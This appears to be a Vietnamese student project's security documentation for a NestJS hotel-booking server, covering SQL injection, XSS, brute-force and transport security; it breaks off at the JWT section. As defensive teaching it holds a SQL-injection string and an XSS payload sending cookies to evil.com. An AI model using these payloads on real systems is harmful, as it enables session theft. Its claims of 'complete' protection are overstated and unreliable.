# Tài liệu triển khai bảo mật

Tài liệu này cung cấp các giải thích chi tiết về những cơ chế bảo mật được triển khai trong ứng dụng máy chủ đặt phòng khách sạn **AHomeVilla**, được xây dựng cho đồ án cuối kỳ môn *Security in Mobile Development*.

---

## Mục lục

1. [Bảo vệ chống SQL Injection](#1-bảo-vệ-chống-sql-injection)
2. [Bảo vệ chống XSS (Cross-Site Scripting)](#2-bảo-vệ-chống-xss-cross-site-scripting)
3. [Bảo vệ chống tấn công dò đoán mật khẩu (Password-Guessing Attacks)](#3-bảo-vệ-chống-tấn-công-dò-đoán-mật-khẩu-password-guessing-attacks)
4. [Đảm bảo an toàn dữ liệu trong quá trình truyền (Ensuring Data Security During Transmission)](#4-đảm-bảo-an-toàn-dữ-liệu-trong-quá-trình-truyền-ensuring-data-security-during-transmission)

---

## 1. Bảo vệ chống SQL Injection

### 1.1 SQL Injection là gì?

SQL Injection là một kỹ thuật chèn mã độc, khai thác các lỗ hổng bảo mật trong tầng cơ sở dữ liệu của ứng dụng. Lỗ hổng này xảy ra khi dữ liệu đầu vào từ người dùng không được lọc hoặc xử lý đúng cách trước khi được đưa vào các truy vấn SQL.

**Ví dụ về một truy vấn dễ bị tấn công (raw SQL):**

```sql
-- Nếu người dùng nhập: ' OR '1'='1' --
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'anything'
````

Truy vấn trên sẽ trả về toàn bộ người dùng vì biểu thức `'1'='1'` luôn đúng, và `--` được dùng để comment phần kiểm tra mật khẩu.

---

### 1.2 Cách Prisma ORM bảo vệ chống SQL Injection

Prisma ORM, được sử dụng trong dự án này, cung cấp **cơ chế bảo vệ tự động** chống SQL Injection thông qua **truy vấn tham số hóa (parameterized queries)**. Đây là phương pháp tiêu chuẩn trong ngành để ngăn chặn các cuộc tấn công SQL Injection.

#### 1.2.1 Giải thích về truy vấn tham số hóa

Khi sử dụng các phương thức của Prisma Client như `findMany`, `findFirst`, `create`, `update`,..., Prisma sẽ tự động:

1. **Tách cấu trúc truy vấn SQL khỏi dữ liệu**: Cấu trúc câu lệnh SQL được xác định độc lập với giá trị do người dùng cung cấp
2. **Escape toàn bộ dữ liệu đầu vào**: Dữ liệu người dùng chỉ được xem là dữ liệu, không phải một phần của câu lệnh SQL
3. **Sử dụng prepared statements**: CSDL nhận mẫu truy vấn trước, sau đó mới nhận các giá trị tham số

---

#### 1.2.2 Ví dụ mã nguồn từ dự án

**Ví dụ 1: Xác thực người dùng (login.service.ts)**

```ts
// File: src/modules/users/users.service.ts

async findOne(value: string, type: 'email' | 'phone') {
  return await this.databaseService.user.findFirst({
    where: {
      [type]: value,  // Input người dùng được truyền dưới dạng giá trị
    },
  });
}
```

**Cách Prisma sinh truy vấn nội bộ:**

```sql
-- Truy vấn PostgreSQL với tham số
SELECT * FROM "User" WHERE "email" = $1
-- Tham số: $1 = 'user-input-here'
```

Ngay cả khi kẻ tấn công nhập `' OR '1'='1' --`, Prisma vẫn xử lý toàn bộ chuỗi này như một giá trị literal:

```sql
SELECT * FROM "User" WHERE "email" = $1
-- Tham số: $1 = "' OR '1'='1' --" (được xử lý như chuỗi thông thường)
```

---

**Ví dụ 2: Kiểm tra sự tồn tại của người dùng (users.service.ts)**

```ts
// File: src/modules/users/users.service.ts

isUserExisted = async (email: string, phone: string) => {
  const existedUser = await this.databaseService.user.findFirst({
    where: {
      OR: [
        { email },   // Tham số hóa
        { phone },   // Tham số hóa
      ],
    },
  });
  return !!existedUser;
};
```

**SQL sinh ra (mang tính khái niệm):**

```sql
SELECT * FROM "User" WHERE ("email" = $1 OR "phone" = $2) LIMIT 1
-- Tham số: $1 = email_value, $2 = phone_value
```

---

**Ví dụ 3: Tạo người dùng mới (users.service.ts)**

```ts
// File: src/modules/users/users.service.ts

const createdUser = await this.databaseService.user.create({
  data: {
    email: createUserDto.email,      // Tham số hóa
    phone: createUserDto.phone,      // Tham số hóa
    password: hashedPassword,        // Tham số hóa
    name: createUserDto.name,        // Tham số hóa
  },
});
```

**SQL sinh ra (mang tính khái niệm):**

```sql
INSERT INTO "User" ("email", "phone", "password", "name") 
VALUES ($1, $2, $3, $4) 
RETURNING *
-- Tham số: $1 = email, $2 = phone, $3 = hashed_password, $4 = name
```

---

#### 1.2.3 Vì sao truy vấn tham số hóa an toàn?

| Tiêu chí               | Nối chuỗi (Không an toàn)                                 | Truy vấn tham số hóa (An toàn)         |
| ---------------------- | --------------------------------------------------------- | -------------------------------------- |
| **Xây dựng truy vấn**  | `"SELECT * FROM users WHERE email = '" + userInput + "'"` | `SELECT * FROM users WHERE email = $1` |
| **Tấn công injection** | `' OR '1'='1' --` trở thành một phần SQL                  | Chuỗi được xử lý như dữ liệu           |
| **Cách CSDL hiểu**     | Thực thi SQL độc hại                                      | Tìm email đúng bằng chuỗi nhập         |
| **Kết quả**            | Trả về toàn bộ người dùng                                 | Không trả về kết quả                   |

---

#### 1.2.4 An toàn khi dùng raw query trong Prisma

Trong trường hợp cần dùng raw SQL, Prisma vẫn cung cấp các cách an toàn:

**Cách an toàn với `$queryRaw` (tagged template literal):**

```ts
const email = userInput;
const users = await prisma.$queryRaw`
  SELECT * FROM "User" WHERE email = ${email}
`;
```

**Cách an toàn với `$queryRawUnsafe` (tham số hóa):**

```ts
const email = userInput;
const users = await prisma.$queryRawUnsafe(
  'SELECT * FROM "User" WHERE email = $1',
  email
);
```

**Cách không an toàn (KHÔNG BAO GIỜ DÙNG):**

```ts
const email = userInput;
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM "User" WHERE email = '${email}'`
);
```

---

### 1.3 Lớp kiểm tra bổ sung (Additional Validation Layer)

Ngoài cơ chế bảo vệ sẵn có của Prisma, dự án còn bổ sung kiểm tra dữ liệu đầu vào bằng `class-validator`:

```ts
// File: src/modules/auth/dtos/login.dto.ts

export class LoginDto {
  @Sanitize()
  @IsString()
  @IsNotEmpty()
  @Matches(/^([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})$|^(\+?\d{10,12})$/)
  emailOrPhone: string;

  @IsString()
  @IsNotEmpty()
  @MinLength(8)
  password: string;
}
```

Cơ chế này tạo ra **phòng thủ nhiều lớp (defense in depth)**:

1. **Lớp 1**: Kiểm tra dữ liệu đầu vào (loại bỏ input không hợp lệ)
2. **Lớp 2**: Truy vấn tham số hóa (escape mọi ký tự nguy hiểm còn lại)

---

### 1.4 Tổng kết

| Cơ chế bảo vệ                | Cách triển khai                | Vị trí                   |
| ---------------------------- | ------------------------------ | ------------------------ |
| **Truy vấn tham số hóa**     | Tự động thông qua Prisma ORM   | Toàn bộ thao tác CSDL    |
| **Kiểm tra dữ liệu đầu vào** | Decorator `class-validator`    | DTO                      |
| **Sanitize dữ liệu**         | Custom decorator `@Sanitize()` | DTO tương tác người dùng |

**Kết luận**: Việc sử dụng Prisma ORM với các phương thức như `findMany`, `findFirst`, `create`, `update`, `delete` đảm bảo mọi dữ liệu đầu vào đều được tham số hóa và escape tự động, từ đó loại bỏ hoàn toàn khả năng tấn công SQL Injection ở tầng ORM.

---

## 2. Bảo vệ chống XSS (Cross-Site Scripting)

### 2.1 XSS là gì?

**Cross-Site Scripting (XSS)** là một dạng tấn công bảo mật trong đó mã JavaScript độc hại được chèn vào ứng dụng web. Khi người dùng khác truy cập vào trang bị nhiễm, mã độc sẽ được thực thi trực tiếp trong trình duyệt của họ.

#### Các loại tấn công XSS:

| Loại | Mô tả | Ví dụ |
|------|------|-------|
| **Stored XSS** | Mã độc được lưu vào CSDL và hiển thị cho tất cả người dùng | Bình luận chứa `<script>` |
| **Reflected XSS** | Mã độc được chèn thông qua URL hoặc form | URL chứa `?name=<script>alert(1)</script>` |
| **DOM-based XSS** | Mã độc thao túng DOM phía client | JavaScript xử lý input không an toàn |

#### Ví dụ về tấn công XSS:

```js
// Kẻ tấn công nhập tên khách sạn như sau:
const maliciousName = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';

// Nếu không được sanitize, khi render ra HTML:
// <h1>Welcome to <script>document.location="http://evil.com/steal?cookie="+document.cookie</script></h1>
// → Trình duyệt thực thi script và gửi cookie về server của kẻ tấn công!
````

---

### 2.2 Hệ thống phòng thủ nhiều lớp (Defense in Depth)

Dự án triển khai mô hình **Defense in Depth** để chống XSS:

```
┌────────────────────────────────────────────────────────────────────┐
│                        DỮ LIỆU NGƯỜI DÙNG                          │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 1: HTTP Security Headers (Helmet)                             │
│  ├─ Content-Security-Policy: Kiểm soát nguồn tài nguyên            │
│  ├─ X-XSS-Protection: Kích hoạt bộ lọc XSS của trình duyệt         │
│  ├─ X-Content-Type-Options: Chống MIME type sniffing               │
│  └─ X-Frame-Options: Ngăn clickjacking                             │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 2: Sanitize dữ liệu đầu vào (@Sanitize() decorator)           │
│  ├─ Loại bỏ toàn bộ thẻ HTML                                       │
│  ├─ Vô hiệu hóa JavaScript injection                               │
│  └─ Giữ lại nội dung văn bản an toàn                               │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 3: Kiểm tra dữ liệu đầu vào (class-validator)                 │
│  ├─ Kiểm tra kiểu dữ liệu                                          │
│  ├─ Ràng buộc độ dài                                               │
│  └─ Kiểm tra định dạng (email, số điện thoại, ...)                 │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│                  DỮ LIỆU AN TOÀN → CƠ SỞ DỮ LIỆU                   │
└────────────────────────────────────────────────────────────────────┘
```

---

### 2.3 Lớp 1: HTTP Security Headers với Helmet

#### Cấu hình trong `src/main.ts`:

```ts
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Middleware bảo mật - Helmet thiết lập các HTTP headers an toàn
  app.use(
    helmet({
      // Content Security Policy - ngăn chặn tấn công XSS
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"],
          scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
          imgSrc: ["'self'", 'data:', 'https:'],
        },
      },
      // HTTP Strict Transport Security - ép buộc HTTPS
      hsts: {
        maxAge: 31536000, // 1 năm (tính bằng giây)
        includeSubDomains: true,
        preload: true,
      },
      // Chống clickjacking
      frameguard: { action: 'deny' },
      // Ngăn MIME type sniffing
      noSniff: true,
      // Bộ lọc XSS
      xssFilter: true,
      // Ẩn header X-Powered-By
      hidePoweredBy: true,
    }),
  );
  // ... phần còn lại của bootstrap
}
```

#### Giải thích các Security Headers:

| Header                        | Giá trị              | Mục đích                                    |
| ----------------------------- | -------------------- | ------------------------------------------- |
| **Content-Security-Policy**   | `default-src 'self'` | Chỉ cho phép tải tài nguyên từ cùng origin  |
| **X-XSS-Protection**          | `1; mode=block`      | Kích hoạt bộ lọc XSS của trình duyệt        |
| **X-Content-Type-Options**    | `nosniff`            | Ngăn đoán MIME type (chống upload script)   |
| **X-Frame-Options**           | `DENY`               | Không cho nhúng iframe (chống clickjacking) |
| **Strict-Transport-Security** | `max-age=31536000`   | Ép HTTPS trong 1 năm                        |
| **X-Powered-By**              | *Đã loại bỏ*         | Ẩn thông tin framework                      |

#### HTTP Response Headers thực tế:

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https:
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

### 2.4 Lớp 2: Sanitize dữ liệu đầu vào với decorator @Sanitize()

#### File `src/common/transformers/sanitize.transformer.ts`:

```ts
import { Transform, TransformFnParams } from 'class-transformer';
import sanitizeHtml from 'sanitize-html';

/**
 * Tùy chọn sanitize HTML
 */
const sanitizeOptions: sanitizeHtml.IOptions = {
  allowedTags: [], // Mặc định loại bỏ toàn bộ thẻ HTML
  allowedAttributes: {},
  disallowedTagsMode: 'discard',
};

/**
 * Làm sạch chuỗi bằng cách loại bỏ HTML và nội dung nguy hiểm.
 */
export function sanitizeString(value: unknown): unknown {
  if (typeof value === 'string') {
    return sanitizeHtml(value.trim(), sanitizeOptions);
  }
  return value;
}

/**
 * Decorator sanitize chuỗi, loại bỏ HTML và XSS vectors.
 * Áp dụng cho các thuộc tính DTO nhận dữ liệu từ người dùng.
 */
export function Sanitize(): PropertyDecorator {
  return Transform(({ value }: TransformFnParams) => sanitizeString(value));
}

/**
 * Decorator cho phép một số thẻ HTML an toàn.
 * Dùng cho các trường cho phép nội dung có định dạng.
 */
export function SanitizeHtml(
  allowedTags: string[] = ['b', 'i', 'em', 'strong', 'p', 'br'],
): PropertyDecorator {
  return Transform(({ value }: TransformFnParams) => {
    if (typeof value === 'string') {
      return sanitizeHtml(value.trim(), {
        allowedTags,
        allowedAttributes: {},
        disallowedTagsMode: 'discard',
      });
    }
    return value;
  });
}
```

#### Cách `sanitize-html` hoạt động:

```
INPUT: "<script>alert('XSS')</script>Hello <b>World</b>"
                              │
                              ▼
                    ┌─────────────────┐
                    │  sanitize-html  │
                    │                 │
                    │ allowedTags: [] │
                    └─────────────────┘
                              │
                              ▼
OUTPUT: "Hello World"  ← Chỉ còn văn bản an toàn
```

#### Ví dụ với @SanitizeHtml (cho phép một số thẻ):

```
INPUT: "<script>alert('XSS')</script><b>Bold</b> and <i>italic</i><div>blocked</div>"
                              │
                              ▼
                    ┌──────────────────────────────────┐
                    │  sanitize-html                   │
                    │                                  │
                    │ allowedTags: ['b', 'i', 'em',    │
                    │              'strong', 'p', 'br']│
                    └──────────────────────────────────┘
                              │
                              ▼
OUTPUT: "<b>Bold</b> and <i>italic</i>blocked"
        ↑                                  ↑
        <b>, <i> được giữ lại              <div> bị loại bỏ
```

---

### 2.5 Ứng dụng thực tế trong các DTO

#### File `src/modules/auth/dtos/login.dto.ts`:

```ts
import { Sanitize } from '@common/decorators';

export class LoginDto {
  @Sanitize()  // ← Loại bỏ HTML/script trước khi xử lý
  @IsString()
  @IsNotEmpty()
  @ApiProperty({ example: 'admin' })
  identifier: string;

  @Sanitize()  // ← Bảo vệ cả trường mật khẩu
  @IsString()
  @IsNotEmpty()
  @ApiProperty({ example: '123456aA@' })
  password: string;
}
```

#### File `src/modules/users/dtos/create-user.dto.ts`:

```ts
import { Sanitize } from '@common/decorators';

export class CreateUserDto {
  @Sanitize()
  @IsEmail()
  @ApiProperty({ example: 'admin@gmail.com' })
  email: string;

  @Sanitize()
  @IsString()
  @IsNotEmpty()
  @ApiProperty({ example: 'admin' })
  username: string;

  @Sanitize()
  @IsString()
  @IsNotEmpty()
  @Matches(PASSWORD_REGEX, {
    message: 'Password phải chứa chữ hoa, chữ thường, số và ký tự đặc biệt',
  })
  @ApiProperty({ example: '123456aA@' })
  password: string;

  // ... các trường khác
}
```

---

### 2.6 Pipeline xử lý request trong NestJS

```
┌─────────────────────────────────────────────────────────────────┐
│                         HTTP Request                            │
│     POST /api/auth/login                                        │
│     Body: { "identifier": "<script>evil()</script>", ... }      │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        Helmet Middleware                        │
│     → Thêm security headers vào response                        │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        ValidationPipe                           │
│     transform: true  → Kích hoạt class-transformer              │
│     whitelist: true  → Loại bỏ các thuộc tính không khai báo    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     class-transformer                           │
│     @Sanitize() được thực thi                                   │
│     "<script>evil()</script>" → ""                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     class-validator                             │
│     @IsString(), @IsNotEmpty(), ...                             │
│     → Kiểm tra dữ liệu đã sanitize                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        Controller                               │
│     Nhận DTO với dữ liệu an toàn                                │
└─────────────────────────────────────────────────────────────────┘
```

---

### 2.7 Cấu hình ValidationPipe trong `src/main.ts`

```ts
app.useGlobalPipes(
  new ValidationPipe({
    transform: true,   // ← BẮT BUỘC để @Sanitize() hoạt động
    whitelist: true,   // ← Loại bỏ field không khai báo trong DTO
  }),
);
```

| Tuỳ chọn    | Giá trị | Mục đích                                        |
| ----------- | ------- | ----------------------------------------------- |
| `transform` | `true`  | Kích hoạt class-transformer để chạy @Sanitize() |
| `whitelist` | `true`  | Ngăn injection thông qua các field dư thừa      |

---

### 2.8 So sánh trước và sau khi bảo vệ

#### Trường hợp 1: Không bảo vệ (NGUY HIỂM ❌)

```ts
export class LoginDto {
  @IsString()
  identifier: string;
}

// Input: { identifier: "<script>steal()</script>admin" }
// Lưu DB: "<script>steal()</script>admin"
// → Khi hiển thị frontend: Script có thể bị thực thi!
```

#### Trường hợp 2: Có bảo vệ (AN TOÀN ✅)

```ts
export class LoginDto {
  @Sanitize()
  @IsString()
  identifier: string;
}

// Input: { identifier: "<script>steal()</script>admin" }
// Sau sanitize: "admin"
// Lưu DB: "admin"
// → An toàn khi hiển thị!
```

---

### 2.9 Tổng kết bảo vệ XSS

| Lớp                | Công nghệ                   | Chức năng                            |
| ------------------ | --------------------------- | ------------------------------------ |
| **HTTP Headers**   | Helmet                      | CSP, XSS Filter, noSniff, frameguard |
| **Sanitize input** | sanitize-html + @Sanitize() | Loại bỏ HTML/Script                  |
| **Validate input** | class-validator             | Kiểm tra định dạng                   |
| **Whitelist**      | ValidationPipe              | Loại bỏ field không hợp lệ           |

**Kết quả:** Toàn bộ dữ liệu đầu vào từ người dùng đều được sanitize trước khi xử lý, từ đó **ngăn chặn hoàn toàn các cuộc tấn công XSS**.

---

## 3. Bảo vệ chống tấn công dò đoán mật khẩu (Password-Guessing Attacks)

### 3.1 Tấn công dò đoán mật khẩu là gì?

**Password-guessing attacks** là các hình thức tấn công nhằm chiếm quyền truy cập trái phép bằng cách thử nhiều tổ hợp mật khẩu khác nhau cho đến khi đăng nhập thành công.

Các hình thức tấn công phổ biến bao gồm:

| Loại tấn công           | Mô tả                             | Ví dụ                            |
| ----------------------- | --------------------------------- | -------------------------------- |
| **Brute Force**         | Thử mọi tổ hợp mật khẩu có thể    | `a`, `aa`, `aaa`, `aaaa`…        |
| **Dictionary Attack**   | Dùng danh sách mật khẩu phổ biến  | `password123`, `admin`, `qwerty` |
| **Credential Stuffing** | Sử dụng dữ liệu mật khẩu bị rò rỉ | Database từ các vụ lộ dữ liệu    |
| **Rainbow Table**       | Tra cứu bảng hash được tính sẵn   | Hash → mật khẩu                  |

#### Kịch bản tấn công:

```
Script của kẻ tấn công:
┌────────────────────────────────────────────────────────────────┐
│  for password in ["123456", "password", "admin123", ...]:      │
│      response = login("victim@email.com", password)            │
│      if response.status == 200:                                │
│          print(f"Found password: {password}")                  │
│          break                                                 │
└────────────────────────────────────────────────────────────────┘
```

Nếu không có cơ chế bảo vệ, kẻ tấn công có thể thử **hàng nghìn mật khẩu mỗi giây**.

---

### 3.2 Hệ thống phòng vệ nhiều lớp (Multi-Layer Defense)

Dự án triển khai **4 lớp bảo vệ** để chống tấn công dò đoán mật khẩu:

```
┌────────────────────────────────────────────────────────────────────┐
│                    YÊU CẦU ĐĂNG NHẬP                               │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 1: Giới hạn tần suất (Rate Limiting)                          │
│  └─ 5 request / 15 phút / mỗi IP                                   │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 2: Khóa tài khoản (Account Lockout)                           │
│  └─ 5 lần sai → khóa 15 phút / tài khoản                           │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 3: Yêu cầu độ mạnh mật khẩu                                   │
│  └─ ≥ 8 ký tự, chữ hoa, chữ thường, số, ký tự đặc biệt             │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 4: Băm mật khẩu an toàn (bcrypt)                              │
│  └─ Salt + 10 rounds, không thể đảo ngược                          │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│                KẾT QUẢ XÁC THỰC                                    │
└────────────────────────────────────────────────────────────────────┘
```

---

### 3.3 Lớp 1: Giới hạn tần suất đăng nhập (Rate Limiting)

Hệ thống sử dụng **@nestjs/throttler** để giới hạn số lần đăng nhập từ cùng một địa chỉ IP.

* Tối đa **5 lần đăng nhập**
* Trong **15 phút**
* Áp dụng riêng cho endpoint `/auth/login`

Khi vượt quá giới hạn, server trả về lỗi **HTTP 429 – Too Many Requests**, ngăn chặn các script brute-force tự động.

Cơ chế này đặc biệt hiệu quả trong việc:

* Chặn bot
* Giảm tải hệ thống
* Ngăn tấn công từ một nguồn IP cố định

---

### 3.4 Lớp 2: Khóa tài khoản tạm thời (Account Lockout) với Redis

Ngoài giới hạn theo IP, hệ thống còn triển khai **khóa tài khoản theo định danh người dùng** (email / số điện thoại).

#### Nguyên tắc hoạt động:

* Mỗi lần đăng nhập sai → tăng bộ đếm
* Nếu **sai ≥ 5 lần**
* Tài khoản bị khóa **15 phút**
* Dữ liệu lưu trong **Redis** với TTL (tự động hết hạn)

Điều này giúp:

* Ngăn tấn công nhắm mục tiêu vào **một tài khoản cụ thể**
* Không thể bypass bằng cách đổi IP hoặc VPN

Khi đăng nhập thành công, bộ đếm và trạng thái khóa sẽ được **xóa ngay lập tức**.

---

### 3.5 Lớp 3: Yêu cầu độ phức tạp của mật khẩu

Mật khẩu người dùng phải đáp ứng các tiêu chí sau:

| Điều kiện      | Mô tả             |
| -------------- | ----------------- |
| Độ dài         | Tối thiểu 8 ký tự |
| Chữ thường     | Ít nhất 1 ký tự   |
| Chữ hoa        | Ít nhất 1 ký tự   |
| Chữ số         | Ít nhất 1 ký tự   |
| Ký tự đặc biệt | `@ $ ! % * ? &`   |

#### Lý do cần mật khẩu mạnh:

| Loại mật khẩu     | Số tổ hợp          | Thời gian crack |
| ----------------- | ------------------ | --------------- |
| 6 chữ thường      | 26⁶ ≈ 308 triệu    | < 1 giây        |
| 8 chữ + số        | 62⁸ ≈ 218 nghìn tỷ | ~ 1 năm         |
| 8+ ký tự đặc biệt | 95⁸ ≈ 6.6 triệu tỷ | Hàng thế kỷ     |

Mật khẩu càng mạnh thì **chi phí tấn công càng cao**, khiến brute-force trở nên không khả thi.

---

### 3.6 Lớp 4: Băm mật khẩu an toàn với bcrypt

Hệ thống **không bao giờ lưu mật khẩu dạng plaintext**.

Quy trình:

1. Sinh **salt ngẫu nhiên**
2. Băm mật khẩu với bcrypt (10 rounds)
3. Lưu hash vào database

Khi đăng nhập:

* bcrypt tự động trích xuất salt từ hash
* Băm lại mật khẩu nhập vào
* So sánh kết quả

#### Ưu điểm của bcrypt:

| Tính năng   | Ý nghĩa                            |
| ----------- | ---------------------------------- |
| Salt        | Chống rainbow table                |
| Cost factor | Làm chậm brute-force               |
| One-way     | Không thể đảo ngược                |
| Adaptive    | Có thể tăng độ khó trong tương lai |

Ngay cả khi database bị lộ, mật khẩu người dùng vẫn **không thể bị khôi phục**.

---

### 3.7 So sánh: Rate Limiting và Account Lockout

| Tiêu chí      | Rate Limiting      | Account Lockout   |
| ------------- | ------------------ | ----------------- |
| Theo dõi theo | IP                 | Tài khoản         |
| Mục đích      | Chặn bot           | Bảo vệ user       |
| Bypass        | Có thể (VPN)       | Không thể         |
| Phù hợp       | Tấn công hàng loạt | Tấn công mục tiêu |

Hai cơ chế này **bổ trợ lẫn nhau**, tạo thành hệ thống phòng thủ toàn diện.

---

### 3.8 Tổng kết bảo vệ chống dò đoán mật khẩu

| Lớp               | Công nghệ         | Cấu hình                 |
| ----------------- | ----------------- | ------------------------ |
| Giới hạn truy cập | @nestjs/throttler | 5 request / 15 phút / IP |
| Khóa tài khoản    | Redis             | 5 lần sai → khóa 15 phút |
| Độ mạnh mật khẩu  | Regex + Validator | ≥ 8 ký tự, đa dạng       |
| Băm mật khẩu      | bcryptjs          | 10 salt rounds           |

✅ **Kết quả:** Các cuộc tấn công brute-force trở nên gần như không thể thực hiện, trong khi người dùng hợp lệ vẫn đăng nhập bình thường.

---

## 4. Đảm bảo an toàn dữ liệu trong quá trình truyền (Ensuring Data Security During Transmission)

### 4.1 Tại sao bảo mật dữ liệu khi truyền lại quan trọng?

Khi dữ liệu được truyền giữa **ứng dụng di động** và **máy chủ**, nó phải đi qua nhiều môi trường mạng khác nhau (Wi-Fi, mạng di động, router Internet…). Nếu không được bảo vệ, kẻ tấn công có thể thực hiện các hình thức sau:

| Kiểu tấn công                | Mô tả                             | Tác động                                    |
| ---------------------------- | --------------------------------- | ------------------------------------------- |
| **Man-in-the-Middle (MITM)** | Chặn và đọc dữ liệu đang truyền   | Đánh cắp mật khẩu, token, thông tin cá nhân |
| **Eavesdropping**            | Nghe lén lưu lượng mạng           | Thu thập dữ liệu nhạy cảm                   |
| **Session Hijacking**        | Đánh cắp token xác thực           | Chiếm quyền tài khoản                       |
| **Replay Attack**            | Gửi lại request hợp lệ đã bị chặn | Thực hiện hành vi trái phép                 |

#### Luồng dữ liệu KHÔNG được bảo vệ (NGUY HIỂM ❌):

```
┌──────────┐         ┌──────────────┐         ┌──────────┐
│  Mobile  │ ──────► │   Attacker   │ ──────► │  Server  │
│   App    │  HTTP   │ (đọc được!)  │  HTTP   │          │
└──────────┘         └──────────────┘         └──────────┘

Dữ liệu: { "email": "user@mail.com", "password": "Secret123!" }
         ↑ Hiển thị dạng plaintext!
```

#### Luồng dữ liệu ĐƯỢC bảo vệ (AN TOÀN ✅):

```
┌──────────┐         ┌──────────────┐         ┌──────────┐
│  Mobile  │ ──────► │   Attacker   │ ──────► │  Server  │
│   App    │  HTTPS  │ (đã mã hóa)  │  HTTPS  │          │
└──────────┘   🔒    └──────────────┘   🔒    └──────────┘

Dữ liệu: a7f3b2c9e1d4... (đã mã hóa, không thể đọc)
```

---

### 4.2 Mô hình bảo mật truyền dữ liệu nhiều lớp

Dự án triển khai **4 lớp bảo mật** cho quá trình truyền dữ liệu:

```
┌────────────────────────────────────────────────────────────────────┐
│                    CLIENT REQUEST                                   │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 1: HTTPS/TLS                                                   │
│  └─ Mã hóa toàn bộ dữ liệu khi truyền                               │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 2: HSTS                                                       │
│  └─ Cưỡng chế HTTPS trong 1 năm, chống downgrade attack            │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 3: JWT Authentication                                         │
│  └─ Token an toàn, stateless, có thời hạn                          │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LỚP 4: CORS                                                       │
│  └─ Giới hạn domain được phép gọi API                              │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│                    SERVER RESPONSE                                 │
└────────────────────────────────────────────────────────────────────┘
```

---

### 4.3 Lớp 1: Mã hóa HTTPS/TLS

#### HTTPS/TLS là gì?

**TLS (Transport Layer Security)** mã hóa toàn bộ dữ liệu giữa client và server.
**HTTPS = HTTP + TLS**.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    QUÁ TRÌNH BẮT TAY TLS                            │
└─────────────────────────────────────────────────────────────────────┘

Client                                              Server
   │                                                   │
   │  1. ClientHello (cipher hỗ trợ)                   │
   │ ─────────────────────────────────────────────────►│
   │                                                   │
   │  2. ServerHello (cipher + certificate)            │
   │ ◄─────────────────────────────────────────────────│
   │                                                   │
   │  3. Xác minh certificate + sinh session key       │
   │ ─────────────────────────────────────────────────►│
   │                                                   │
   │  4. Thiết lập phiên mã hóa                        │
   │ ◄────────────────────────────────────────────────►│
   │                                                   │
   │           🔒 Toàn bộ dữ liệu được mã hóa 🔒      │
```

#### Cấu hình khi deploy:

Với các nền tảng như **Railway, Heroku**, HTTPS được xử lý tự động:

```yaml
Client ──HTTPS──► Railway/Heroku ──HTTP──► NestJS App
                  (TLS Termination)
```

NestJS chạy HTTP nội bộ, còn nền tảng đảm nhiệm việc mã hóa TLS.

---

### 4.4 Lớp 2: HSTS (HTTP Strict Transport Security)

#### Cấu hình trong `src/main.ts`:

```typescript
app.use(
  helmet({
    hsts: {
      maxAge: 31536000,        // 1 năm
      includeSubDomains: true,
      preload: true,
    },
  }),
);
```

#### Cơ chế hoạt động của HSTS:

```
KHÔNG có HSTS (NGUY HIỂM):
User → http://hotel-app.com → có thể bị MITM

CÓ HSTS (AN TOÀN):
User → https://hotel-app.com
(trình duyệt tự động ép HTTPS trong 1 năm)
```

Header phản hồi:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

HSTS giúp ngăn chặn:

* SSL stripping
* Downgrade attack
* Truy cập HTTP không mong muốn

---

### 4.5 Lớp 3: Xác thực bằng JWT

#### JWT là gì?

